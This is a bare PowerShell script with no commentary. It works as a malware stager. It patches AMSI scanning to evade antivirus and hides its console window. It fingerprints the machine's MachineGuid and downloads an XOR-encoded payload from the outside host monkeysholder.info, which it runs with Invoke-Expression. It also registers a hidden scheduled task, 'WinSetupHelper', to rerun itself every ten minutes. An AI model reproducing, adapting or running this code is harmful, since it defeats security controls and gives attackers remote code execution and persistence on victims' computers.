$t = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -match 'iUtils$' }
$m = $t.GetMethods('NonPublic,Static') | Where-Object { $_.Name -match 'canContent$' }
class B0 { static [int] A0([string]$c, [string]$s) { return 1 } }
$r = [B0].GetMethod('A0')
$p = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($r.MethodHandle.Value, 8)
[System.Runtime.InteropServices.Marshal]::Copy(@([IntPtr]$p), 0, [IntPtr]($m.MethodHandle.Value.ToInt64() + 8), 1)
Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
[N.W]::ShowWindow([N.W]::GetConsoleWindow(), 0) | Out-Null
$g = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography').MachineGuid -replace '-',''
$cid = $g.Substring($g.Length - 16)
$tid = -join ((1..8) | ForEach-Object { '{0:x}' -f (Get-Random -Max 16) })
$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$h.Open('GET', 'http://monkeysholder.info/api.php?d5758ec1', $false)
$h.SetRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36')
$h.SetRequestHeader('Client-Id', $cid)
$h.SetRequestHeader('Client-Version', '01010000')
$h.SetRequestHeader('Request-Id', '51')
$h.SetRequestHeader('Trace-Id', $tid)
$h.Send()
$hex = $h.ResponseText
$k = [BitConverter]::GetBytes([Convert]::ToUInt32($tid, 16))
$b = [byte[]]::new($hex.Length / 2)
for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) -bxor $k[$i % 4] }
if (-not $global:_s05F) {
  $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition))
  $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -W Hidden -EncodedCommand $enc"
  $tr = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
  Register-ScheduledTask -TaskName 'WinSetupHelper' -Action $a -Trigger $tr -Force | Start-ScheduledTask
}
Invoke-Expression ([Text.Encoding]::UTF8.GetString($b))
